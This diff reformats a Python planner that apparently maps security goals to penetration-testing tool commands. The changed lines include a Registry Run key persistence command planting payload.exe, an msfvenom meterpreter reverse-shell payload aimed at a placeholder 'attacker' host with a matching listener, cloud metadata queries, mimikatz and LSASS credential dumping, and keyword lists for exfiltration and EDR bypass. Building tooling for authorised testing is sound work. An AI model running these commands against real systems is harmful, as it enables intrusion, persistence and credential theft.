@@ -626,7 +626,12 @@ _MULTI_WORD_CHECKS = [
     ("socks proxy", "chisel", "SOCKS5 proxy via Chisel", "client --socks5"),
     # ── Persistence ─────────────────────────────────────────────────────────
     ("scheduled task", "schtasks", "Windows scheduled task persistence", "/create"),
-    ("registry run", "reg", "Registry Run key persistence", "add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
+    (
+        "registry run",
+        "reg",
+        "Registry Run key persistence",
+        "add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+    ),
     ("web shell", "weevely", "Web shell deployment", ""),
     ("cron persistence", "crontab", "Cron-based persistence", "-e"),
     ("startup persistence", "autoruns", "Startup persistence enumeration", ""),
@@ -649,7 +654,12 @@ _MULTI_WORD_CHECKS = [
     ("spear phishing", "gophish", "Spear phishing campaign", ""),
     ("clone site", "set", "Website cloning for phishing", ""),
     ("credential harvest", "evilginx2", "Credential harvesting reverse proxy", ""),
-    ("email spoofing", "swaks", "Email spoofing test", "--to target@example.com --from spoof@example.com"),
+    (
+        "email spoofing",
+        "swaks",
+        "Email spoofing test",
+        "--to target@example.com --from spoof@example.com",
+    ),
     # ── IoT / Firmware ──────────────────────────────────────────────────────
     ("firmware analysis", "binwalk", "Firmware analysis and extraction", "-e"),
     ("firmware extract", "binwalk", "Firmware extraction", "-eM"),
@@ -676,15 +686,30 @@ _MULTI_WORD_CHECKS = [
     ("azure ad enum", "aadinternals", "Azure AD enumeration", ""),
     ("azure enum", "roadtools", "Azure environment enumeration", ""),
     ("gcp enum", "gcloud", "GCP environment enumeration", "projects list"),
-    ("cloud metadata", "curl", "Cloud metadata service enumeration", "-s http://169.254.169.254/latest/meta-data/"),
-    ("imds enum", "curl", "Instance Metadata Service enumeration", "-s http://169.254.169.254/latest/meta-data/"),
+    (
+        "cloud metadata",
+        "curl",
+        "Cloud metadata service enumeration",
+        "-s http://169.254.169.254/latest/meta-data/",
+    ),
+    (
+        "imds enum",
+        "curl",
+        "Instance Metadata Service enumeration",
+        "-s http://169.254.169.254/latest/meta-data/",
+    ),
     ("iam enum", "gcloud", "IAM permissions enumeration", "projects get-iam-policy"),
     # ── Kubernetes / Container ──────────────────────────────────────────────
     ("kubernetes attack", "kubectl", "Kubernetes attack surface enumeration", "auth can-i --list"),
     ("k8s attack", "kubectl", "Kubernetes attack enumeration", "auth can-i --list"),
     ("container escape", "cdk", "Container escape exploitation", "auto-escape"),
     ("etcd access", "etcdctl", "Etcd datastore access", "get / --prefix"),
-    ("rbac audit", "kubectl", "Kubernetes RBAC audit", "auth can-i --list --as system:serviceaccount"),
+    (
+        "rbac audit",
+        "kubectl",
+        "Kubernetes RBAC audit",
+        "auth can-i --list --as system:serviceaccount",
+    ),
     # ── Cryptography / Hash ─────────────────────────────────────────────────
     ("hash identify", "hashid", "Hash type identification", ""),
     ("hash crack", "hashcat", "Password hash cracking", "-a 0"),
@@ -1439,7 +1464,9 @@ class RegistryPlanner:
                 {
                     "description": "Registry Run key persistence",
                     "tool": "reg",
-                    "args": {"flags": "add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d payload.exe"},
+                    "args": {
+                        "flags": "add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d payload.exe"
+                    },
                 },
                 {
                     "description": "Linux cron-based persistence",
@@ -1456,12 +1483,16 @@ class RegistryPlanner:
                 {
                     "description": "Generate reverse shell payload with msfvenom",
                     "tool": "msfvenom",
-                    "args": {"flags": "-p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe"},
+                    "args": {
+                        "flags": "-p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe"
+                    },
                 },
                 {
                     "description": "Start Metasploit multi-handler listener",
                     "tool": "msfconsole",
-                    "args": {"flags": "-q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'"},
+                    "args": {
+                        "flags": "-q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'"
+                    },
                 },
                 {
                     "description": "C2 infrastructure port check",
@@ -1527,7 +1558,9 @@ class RegistryPlanner:
                 {
                     "description": "ICS/SCADA device discovery via Nmap ICS scripts",
                     "tool": "nmap",
-                    "args": {"flags": "--script modbus-discover,dnp3-info,s7-info -p 102,502,20000"},
+                    "args": {
+                        "flags": "--script modbus-discover,dnp3-info,s7-info -p 102,502,20000"
+                    },
                 },
                 {
                     "description": "Modbus device enumeration",
@@ -1635,7 +1668,9 @@ class RegistryPlanner:
                 {
                     "description": "GCP metadata service enumeration",
                     "tool": "curl",
-                    "args": {"flags": "-s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"},
+                    "args": {
+                        "flags": "-s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"
+                    },
                 },
                 {
                     "description": "Multi-cloud GCP security audit",
@@ -2684,13 +2719,21 @@ class RegistryPlanner:
             "sentinel": ("sentinel", "Azure Sentinel SIEM query", ""),
             "qradar": ("curl", "QRadar SIEM query", ""),
             "misp": ("curl", "MISP threat intelligence platform", ""),
-            "crackmapexec": ("crackmapexec", "SMB host reachability and authentication check", "smb"),
+            "crackmapexec": (
+                "crackmapexec",
+                "SMB host reachability and authentication check",
+                "smb",
+            ),
             "netexec": ("netexec", "SMB host reachability and network authentication check", "smb"),
             # ── Windows Privilege Escalation ──────────────────────────────────────────
             "winpeas": ("winpeas", "Windows privilege escalation enumeration", "quiet"),
             "powerup": ("powerup", "PowerShell privilege escalation checks", "Invoke-AllChecks"),
             "seatbelt": ("seatbelt", "Windows security recon with Seatbelt", "-group=all"),
-            "incognito": ("incognito", "Token impersonation and privilege enumeration", "list_tokens -u"),
+            "incognito": (
+                "incognito",
+                "Token impersonation and privilege enumeration",
+                "list_tokens -u",
+            ),
             "juicypotato": ("JuicyPotatoNG", "JuicyPotato privilege escalation", ""),
             "printspoofer": ("PrintSpoofer", "PrintSpoofer privilege escalation", "-i -c cmd"),
             "godpotato": ("GodPotato", "GodPotato privilege escalation", ""),
@@ -2713,7 +2756,11 @@ class RegistryPlanner:
             "veil": ("veil", "AV evasion payload framework", ""),
             "donut": ("donut", "Shellcode generation from .NET/PE", ""),
             "shellter": ("shellter", "Dynamic shellcode injector", ""),
-            "msfvenom": ("msfvenom", "Payload generation with msfvenom", "-p windows/x64/meterpreter/reverse_tcp"),
+            "msfvenom": (
+                "msfvenom",
+                "Payload generation with msfvenom",
+                "-p windows/x64/meterpreter/reverse_tcp",
+            ),
             # ── Post-Exploitation / C2 ────────────────────────────────────────────────
             "msfconsole": ("msfconsole", "Metasploit Framework console", "-q"),
             "empire": ("empire", "PowerShell Empire C2 framework", ""),
@@ -2722,7 +2769,11 @@ class RegistryPlanner:
             "villain": ("villain", "Villain C2 framework", ""),
             # ── Active Directory ──────────────────────────────────────────────────────
             "rubeus": ("rubeus", "Kerberos attack toolkit", ""),
-            "mimikatz": ("mimikatz", "Credential extraction and Kerberos attacks", "sekurlsa::logonpasswords"),
+            "mimikatz": (
+                "mimikatz",
+                "Credential extraction and Kerberos attacks",
+                "sekurlsa::logonpasswords",
+            ),
             "pypykatz": ("pypykatz", "Python Mimikatz implementation", "lsa minidump"),
             "nanodump": ("nanodump", "LSASS memory dump", "--write /tmp/lsass.dmp"),
             "lsassy": ("lsassy", "Remote LSASS dumping", ""),
@@ -2767,7 +2818,11 @@ class RegistryPlanner:
             "hashid": ("hashid", "Hash type identification", ""),
             "rsactftool": ("rsactftool", "RSA CTF attack tool", ""),
             "padbuster": ("padbuster", "Padding oracle attack tool", ""),
-            "john": ("john", "John the Ripper password cracker", "--wordlist=/usr/share/wordlists/rockyou.txt"),
+            "john": (
+                "john",
+                "John the Ripper password cracker",
+                "--wordlist=/usr/share/wordlists/rockyou.txt",
+            ),
             # ── CTF / Binary Exploitation ─────────────────────────────────────────────
             "checksec": ("checksec", "Binary security feature checker", "--file"),
             "ropgadget": ("ROPgadget", "ROP gadget finder", "--binary"),
@@ -2780,7 +2835,11 @@ class RegistryPlanner:
             # ── Purple Team ───────────────────────────────────────────────────────────
             "caldera": ("caldera", "MITRE ATT&CK adversary emulation", ""),
             "vectr": ("vectr", "Purple team exercise tracking", ""),
-            "invoke-atomicredteam": ("invoke-atomicredteam", "Atomic Red Team test execution", "Invoke-AtomicTest"),
+            "invoke-atomicredteam": (
+                "invoke-atomicredteam",
+                "Atomic Red Team test execution",
+                "Invoke-AtomicTest",
+            ),
             # ── Network / MITM ────────────────────────────────────────────────────────
             "bettercap": ("bettercap", "Network attack and monitoring framework", ""),
             "ettercap": ("ettercap", "MITM attack toolkit", "-T -q"),
@@ -2911,101 +2970,415 @@ class RegistryPlanner:
 
         kw_map = [
             # ── Application Security ──────────────────────────────────────────────────
-            (("appsec sast", "static analysis", "semgrep", "bandit", "code review", "secure code audit"), "appsec_sast"),
-            (("appsec dast", "dynamic scan", "zap scan", "nikto web scan", "web app vulnerability"), "appsec_dast"),
+            (
+                (
+                    "appsec sast",
+                    "static analysis",
+                    "semgrep",
+                    "bandit",
+                    "code review",
+                    "secure code audit",
+                ),
+                "appsec_sast",
+            ),
+            (
+                (
+                    "appsec dast",
+                    "dynamic scan",
+                    "zap scan",
+                    "nikto web scan",
+                    "web app vulnerability",
+                ),
+                "appsec_dast",
+            ),
             # ── Digital Forensics & Incident Response ─────────────────────────────────
-            (("dfir memory", "memory analysis", "volatility forensics", "dump parse", "yara memory"), "dfir_memory"),
-            (("dfir disk", "disk analysis", "fls directory", "icat file", "foremost carve", "binwalk firmware"), "dfir_disk"),
+            (
+                (
+                    "dfir memory",
+                    "memory analysis",
+                    "volatility forensics",
+                    "dump parse",
+                    "yara memory",
+                ),
+                "dfir_memory",
+            ),
+            (
+                (
+                    "dfir disk",
+                    "disk analysis",
+                    "fls directory",
+                    "icat file",
+                    "foremost carve",
+                    "binwalk firmware",
+                ),
+                "dfir_disk",
+            ),
             # ── Threat Hunting ────────────────────────────────────────────────────────
-            (("threat hunt endpoint", "endpoint hunt", "osquery processes", "velociraptor info"), "threat_hunting_endpoint"),
-            (("threat hunt network", "network hunt", "suricata pcap", "zeek logs", "tshark parse"), "threat_hunting_network"),
+            (
+                ("threat hunt endpoint", "endpoint hunt", "osquery processes", "velociraptor info"),
+                "threat_hunting_endpoint",
+            ),
+            (
+                (
+                    "threat hunt network",
+                    "network hunt",
+                    "suricata pcap",
+                    "zeek logs",
+                    "tshark parse",
+                ),
+                "threat_hunting_network",
+            ),
             # ── Compliance & GRC ──────────────────────────────────────────────────────
-            (("compliance audit", "cis benchmark", "kube-bench", "openscap eval", "secedit export"), "compliance_audit_cis"),
+            (
+                (
+                    "compliance audit",
+                    "cis benchmark",
+                    "kube-bench",
+                    "openscap eval",
+                    "secedit export",
+                ),
+                "compliance_audit_cis",
+            ),
             # ── Exploit Research ──────────────────────────────────────────────────────
-            (("exploit research", "binary debug", "gdb run", "checksec file", "rop chain build", "ropexploit"), "exploit_research"),
+            (
+                (
+                    "exploit research",
+                    "binary debug",
+                    "gdb run",
+                    "checksec file",
+                    "rop chain build",
+                    "ropexploit",
+                ),
+                "exploit_research",
+            ),
             # ── Post-Exploitation ────────────────────────────────────────────────────
-            (("windows privesc", "winpeas", "token impersonation", "juicy potato",
-              "print spoofer", "god potato", "seimpersonate", "unquoted service",
-              "powerup", "seatbelt", "windows privilege escalation"), "windows_privesc"),
-            (("linux privesc", "linpeas", "suid exploit", "sudo abuse",
-              "capabilities exploit", "nfs root squash", "cron abuse",
-              "linux privilege escalation", "gtfobins"), "linux_privesc_full"),
-            (("lateral movement", "pass the hash", "pass-the-hash", "pth attack",
-              "wmiexec", "psexec lateral", "rdp lateral", "pivoting",
-              "port forward", "socks proxy", "chisel", "ligolo"), "lateral_movement"),
-            (("persistence", "backdoor", "webshell", "scheduled task",
-              "registry run", "cron persistence", "startup persistence",
-              "autoruns", "service persistence"), "persistence"),
-            (("c2 setup", "command and control", "c2 infrastructure",
-              "msfvenom", "reverse shell", "listener setup", "meterpreter",
-              "payload generation"), "c2_setup"),
+            (
+                (
+                    "windows privesc",
+                    "winpeas",
+                    "token impersonation",
+                    "juicy potato",
+                    "print spoofer",
+                    "god potato",
+                    "seimpersonate",
+                    "unquoted service",
+                    "powerup",
+                    "seatbelt",
+                    "windows privilege escalation",
+                ),
+                "windows_privesc",
+            ),
+            (
+                (
+                    "linux privesc",
+                    "linpeas",
+                    "suid exploit",
+                    "sudo abuse",
+                    "capabilities exploit",
+                    "nfs root squash",
+                    "cron abuse",
+                    "linux privilege escalation",
+                    "gtfobins",
+                ),
+                "linux_privesc_full",
+            ),
+            (
+                (
+                    "lateral movement",
+                    "pass the hash",
+                    "pass-the-hash",
+                    "pth attack",
+                    "wmiexec",
+                    "psexec lateral",
+                    "rdp lateral",
+                    "pivoting",
+                    "port forward",
+                    "socks proxy",
+                    "chisel",
+                    "ligolo",
+                ),
+                "lateral_movement",
+            ),
+            (
+                (
+                    "persistence",
+                    "backdoor",
+                    "webshell",
+                    "scheduled task",
+                    "registry run",
+                    "cron persistence",
+                    "startup persistence",
+                    "autoruns",
+                    "service persistence",
+                ),
+                "persistence",
+            ),
+            (
+                (
+                    "c2 setup",
+                    "command and control",
+                    "c2 infrastructure",
+                    "msfvenom",
+                    "reverse shell",
+                    "listener setup",
+                    "meterpreter",
+                    "payload generation",
+                ),
+                "c2_setup",
+            ),
             # ── Social Engineering ───────────────────────────────────────────────────
-            (("phishing", "spear phishing", "phishing campaign",
-              "gophish", "clone site", "credential harvest",
-              "email spoofing", "vishing", "smishing", "pretexting",
-              "social engineering"), "phishing_campaign"),
+            (
+                (
+                    "phishing",
+                    "spear phishing",
+                    "phishing campaign",
+                    "gophish",
+                    "clone site",
+                    "credential harvest",
+                    "email spoofing",
+                    "vishing",
+                    "smishing",
+                    "pretexting",
+                    "social engineering",
+                ),
+                "phishing_campaign",
+            ),
             # ── IoT / Embedded ───────────────────────────────────────────────────────
-            (("firmware", "firmware analysis", "iot device", "iot security",
-              "uart", "jtag", "bootloader", "embedded device",
-              "flash dump"), "iot_firmware"),
+            (
+                (
+                    "firmware",
+                    "firmware analysis",
+                    "iot device",
+                    "iot security",
+                    "uart",
+                    "jtag",
+                    "bootloader",
+                    "embedded device",
+                    "flash dump",
+                ),
+                "iot_firmware",
+            ),
             # ── OT / ICS ─────────────────────────────────────────────────────────────
-            (("ics", "scada", "modbus", "dnp3", "plc", "s7",
-              "industrial network", "ot network", "hmi",
-              "ics recon", "scada enum"), "ics_recon"),
+            (
+                (
+                    "ics",
+                    "scada",
+                    "modbus",
+                    "dnp3",
+                    "plc",
+                    "s7",
+                    "industrial network",
+                    "ot network",
+                    "hmi",
+                    "ics recon",
+                    "scada enum",
+                ),
+                "ics_recon",
+            ),
             # ── Mobile ───────────────────────────────────────────────────────────────
-            (("android analysis", "apk analysis", "android security",
-              "adb", "apkleaks", "frida android", "objection android",
-              "mobsf android", "jadx", "dex2jar"), "mobile_android"),
-            (("ios analysis", "ios security", "ipa analysis",
-              "jailbreak", "objection ios", "frida ios",
-              "ssl pinning bypass", "cycript", "clutch"), "mobile_ios"),
+            (
+                (
+                    "android analysis",
+                    "apk analysis",
+                    "android security",
+                    "adb",
+                    "apkleaks",
+                    "frida android",
+                    "objection android",
+                    "mobsf android",
+                    "jadx",
+                    "dex2jar",
+                ),
+                "mobile_android",
+            ),
+            (
+                (
+                    "ios analysis",
+                    "ios security",
+                    "ipa analysis",
+                    "jailbreak",
+                    "objection ios",
+                    "frida ios",
+                    "ssl pinning bypass",
+                    "cycript",
+                    "clutch",
+                ),
+                "mobile_ios",
+            ),
             # ── Cloud Attack ─────────────────────────────────────────────────────────
-            (("azure", "azure ad", "azure ad enum", "aadinternals",
-              "powerzure", "roadtools", "azurehound", "microsoft 365",
-              "entra id", "office 365", "o365"), "cloud_azure"),
-            (("gcp", "google cloud", "gcp enum", "gcloud",
-              "gcpbucketbrute"), "cloud_gcp"),
+            (
+                (
+                    "azure",
+                    "azure ad",
+                    "azure ad enum",
+                    "aadinternals",
+                    "powerzure",
+                    "roadtools",
+                    "azurehound",
+                    "microsoft 365",
+                    "entra id",
+                    "office 365",
+                    "o365",
+                ),
+                "cloud_azure",
+            ),
+            (("gcp", "google cloud", "gcp enum", "gcloud", "gcpbucketbrute"), "cloud_gcp"),
             # ── Kubernetes / Container ───────────────────────────────────────────────
-            (("kubernetes attack", "k8s attack", "container escape",
-              "etcd access", "rbac audit", "pod attack",
-              "kube-hunter", "kube-bench", "k8s exploit"), "k8s_attack"),
+            (
+                (
+                    "kubernetes attack",
+                    "k8s attack",
+                    "container escape",
+                    "etcd access",
+                    "rbac audit",
+                    "pod attack",
+                    "kube-hunter",
+                    "kube-bench",
+                    "k8s exploit",
+                ),
+                "k8s_attack",
+            ),
             # ── Cryptography ─────────────────────────────────────────────────────────
-            (("hash crack", "hash cracking", "rainbow table",
-              "hash identify", "padding oracle",
-              "crypto attack", "rsactftool"), "crypto_attack"),
+            (
+                (
+                    "hash crack",
+                    "hash cracking",
+                    "rainbow table",
+                    "hash identify",
+                    "padding oracle",
+                    "crypto attack",
+                    "rsactftool",
+                ),
+                "crypto_attack",
+            ),
             # ── CTF ──────────────────────────────────────────────────────────────────
-            (("ctf forensics", "capture the flag forensics",
-              "steganography", "ctf stego", "stegsolve", "steg challenge"), "ctf_forensics"),
-            (("pwn", "pwnable", "buffer overflow", "rop chain",
-              "heap exploit", "format string exploit", "bof",
-              "ctf pwn", "binary exploit"), "ctf_pwn"),
-            (("ctf crypto", "crypto challenge", "rsa challenge",
-              "xor cipher", "classical cipher", "vigenere",
-              "caesar cipher"), "ctf_crypto"),
+            (
+                (
+                    "ctf forensics",
+                    "capture the flag forensics",
+                    "steganography",
+                    "ctf stego",
+                    "stegsolve",
+                    "steg challenge",
+                ),
+                "ctf_forensics",
+            ),
+            (
+                (
+                    "pwn",
+                    "pwnable",
+                    "buffer overflow",
+                    "rop chain",
+                    "heap exploit",
+                    "format string exploit",
+                    "bof",
+                    "ctf pwn",
+                    "binary exploit",
+                ),
+                "ctf_pwn",
+            ),
+            (
+                (
+                    "ctf crypto",
+                    "crypto challenge",
+                    "rsa challenge",
+                    "xor cipher",
+                    "classical cipher",
+                    "vigenere",
+                    "caesar cipher",
+                ),
+                "ctf_crypto",
+            ),
             # ── Blue Team ────────────────────────────────────────────────────────────
-            (("threat hunt", "threat hunting", "sigma hunt",
-              "yara hunt", "osquery hunt", "ioc hunt",
-              "hunting for", "hunt for"), "threat_hunting"),
-            (("incident response", "ir triage", "evidence collection",
-              "forensic triage", "ir workflow", "incident handling"), "incident_response_full"),
+            (
+                (
+                    "threat hunt",
+                    "threat hunting",
+                    "sigma hunt",
+                    "yara hunt",
+                    "osquery hunt",
+                    "ioc hunt",
+                    "hunting for",
+                    "hunt for",
+                ),
+                "threat_hunting",
+            ),
+            (
+                (
+                    "incident response",
+                    "ir triage",
+                    "evidence collection",
+                    "forensic triage",
+                    "ir workflow",
+                    "incident handling",
+                ),
+                "incident_response_full",
+            ),
             # ── Purple Team ──────────────────────────────────────────────────────────
-            (("purple team", "atomic red team", "attack simulation",
-              "caldera", "vectr", "detection validation",
-              "mitre att&ck simulation"), "purple_team"),
+            (
+                (
+                    "purple team",
+                    "atomic red team",
+                    "attack simulation",
+                    "caldera",
+                    "vectr",
+                    "detection validation",
+                    "mitre att&ck simulation",
+                ),
+                "purple_team",
+            ),
             # ── Defense Evasion ──────────────────────────────────────────────────────
-            (("edr bypass", "av bypass", "amsi bypass",
-              "defense evasion", "obfuscation", "lolbas",
-              "etw bypass", "uac bypass", "payload obfuscation"), "edr_bypass"),
+            (
+                (
+                    "edr bypass",
+                    "av bypass",
+                    "amsi bypass",
+                    "defense evasion",
+                    "obfuscation",
+                    "lolbas",
+                    "etw bypass",
+                    "uac bypass",
+                    "payload obfuscation",
+                ),
+                "edr_bypass",
+            ),
             # ── Exfiltration ─────────────────────────────────────────────────────────
-            (("data exfil", "exfiltration", "dns exfil",
-              "dns tunnel", "icmp tunnel", "covert channel",
-              "data theft"), "data_exfiltration"),
+            (
+                (
+                    "data exfil",
+                    "exfiltration",
+                    "dns exfil",
+                    "dns tunnel",
+                    "icmp tunnel",
+                    "covert channel",
+                    "data theft",
+                ),
+                "data_exfiltration",
+            ),
             # ── Bug Bounty ───────────────────────────────────────────────────────────
-            (("bug bounty", "vdp", "responsible disclosure",
-              "hackerone", "bugcrowd", "bug hunting"), "bug_bounty_web"),
+            (
+                (
+                    "bug bounty",
+                    "vdp",
+                    "responsible disclosure",
+                    "hackerone",
+                    "bugcrowd",
+                    "bug hunting",
+                ),
+                "bug_bounty_web",
+            ),
             # ── Supply Chain ─────────────────────────────────────────────────────────
-            (("supply chain", "dependency confusion", "typosquatting",
-              "sbom", "bill of materials", "sca scan"), "supply_chain"),
+            (
+                (
+                    "supply chain",
+                    "dependency confusion",
+                    "typosquatting",
+                    "sbom",
+                    "bill of materials",
+                    "sca scan",
+                ),
+                "supply_chain",
+            ),
             (("ssl", "tls", "cipher suite"), "ssl_audit"),
             (("http header", "response header", "security header"), "headers_check"),
             (("cors", "cross-origin", "cross origin", "preflight"), "cors_check"),
@@ -3325,7 +3698,6 @@ class RegistryPlanner:
                 ),
                 "full_audit",
             ),
-
         ]
         for keywords, template_name in kw_map:
             if any(kw in goal_lower for kw in keywords):
